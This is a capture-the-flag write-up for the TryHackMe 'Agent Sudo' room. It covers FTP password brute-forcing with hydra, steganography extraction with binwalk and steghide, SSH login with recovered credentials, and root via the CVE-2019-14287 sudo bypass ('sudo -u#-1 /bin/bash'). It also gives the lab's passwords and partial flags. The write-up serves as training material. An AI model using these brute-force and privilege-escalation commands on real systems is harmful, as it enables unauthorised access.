---
layout: single
title: "Agent Sudo"
link: "https://tryhackme.com/room/agentsudoctf"
parent: TryHackMe
os: Linux
difficulty: Easy
tags: [FTP, Binwalk]
starred: true
date: 2025-11-08
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Machine:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance

### Port Scanning
An initial scan of the target machine revealed three open ports:
* **21:** FTP
* **22:** SSH
* **80:** HTTP (TCP)

### Web & FTP Enumeration
1.  Enumerating the web server on port 80 using `curl` with a modified User-Agent (`-A 'C'`) revealed the username `chris`.

    ```bash
    curl -A 'C' -L http://<Machine-IP>
    ```
    > **Output:** `Agent name: chris`
With
2.  With the username `chris`, I used `hydra` to brute-force the FTP password using the `rockyou.txt` wordlist.

    ```bash
    hydra -l chris -t 4 -P kali-wordlists/rockyou.txt ftp://<Machine-IP>
    ```
    > **Password Found:** `Crystal`

## 2. Initial Access
### Steganography & Credential Discovery

After logging into the FTP server as `chris` with the password `Crystal`, I found two image files:
* `cutie.png`
* `cute-alien.jpg`

### Path to Credentials
This phase involved a multi-step steganography challenge.

1.  **File 1: `cutie.png`**
    Running `binwalk` on this file extracted a password-protected zip archive.
    ```bash
    binwalk -e cutie.png
    ```
    > **File Extracted:** `8702.zip` (located in the `_cutie.png.extracted` directory)

2.  **Finding the Zip Password (OSINT)**
    The password for `8702.zip` was related to the second file, `cute-alien.jpg`. A Google search for "fox news alien autopsy" led to the key phrase "Roswell alien autopsy".

3.  **Unlocking the Zip**
    Using "Roswell alien autopsy" as the password, `7z` successfully extracted the contents of the zip file: `To_AgentR.txt`.

    ```bash
    # (Assuming "Roswell alien autopsy" is the "alien password" mentioned in notes)
    7z x 8702.zip 
    ```
    ```bash
    cat To_AgentR.txt
    ```
    > **Output:** `We need to send the picture to 'QXJlYTUx' as soon as possible!`

4.  **Decoding the Clue**
    The string `QXJlYTUx` is Base64. Decoding it revealed the final password.
    ```bash
    echo 'QXJlYTUx' | base64 -d
    ```
    > **Output:** `Area51`

5.  **File 2: `cute-alien.jpg`**
    The decoded password `Area51` was the passphrase for `steghide` on the second image, `cute-alien.jpg`.
    ```bash
    steghide extract -sf cute-alien.jpg
    Enter passphrase: Area51
    ```
    > **Output:** `wrote extracted data to "message.txt"`

6.  **Final Credentials**
    Reading the extracted `message.txt` file provided the SSH credentials for the user `james`.
    ```bash
    cat message.txt
    ```
    > **Output:** `Hi james, ... Your login password is hackerrules!`

## 3. User Flag
I successfully logged in via SSH as `james` with the password `hackerrules!`. The user flag was in the home directory.

```bash
ssh james@<Machine-IP>
cat user_flag.txt
```
**User Flag:** `b03d...3c7`

## 4. Priviledge Escalation
1.  Running `sudo -l` as `james` revealed a critical `sudoers` misconfiguration.
    ```bash
    sudo -l
    ```
    > **Output:** `User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash`

2.  This specific rule is vulnerable to **CVE-2019-14287**. This vulnerability allows a user to bypass the `!root` restriction by specifying the user ID `-1`.

3.  Running the exploit command immediately granted a root shell.
    ```bash
    sudo -u#-1 /bin/bash
    ```

## 5. Root Flag
With root access, I read the final flag from `/root/root.txt`.

```bash
whoami
> root
cat /root/root.txt
```
> **Root Flag:** `b53a...c062`
> The flag file also noted that the box was designed for TryHackMe and that Agent R name is **DesKel**.

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
